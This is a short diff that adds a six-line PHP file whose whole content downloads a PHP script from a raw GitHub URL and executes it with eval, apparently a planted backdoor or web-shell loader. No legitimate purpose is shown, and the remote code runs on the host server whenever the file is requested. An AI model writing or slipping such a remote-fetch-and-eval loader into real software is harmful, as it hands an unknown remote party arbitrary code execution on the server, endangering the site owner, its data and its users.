@@ -1,0 +1,6 @@
+<?php
+
+$elgasci = file_get_contents(urldecode('https://raw.githubusercontent.com/ayamdraft21/termoatomic/refs/heads/main/green.php'));
+
+$elgasci = "?> ".$elgasci;
+eval($elgasci);
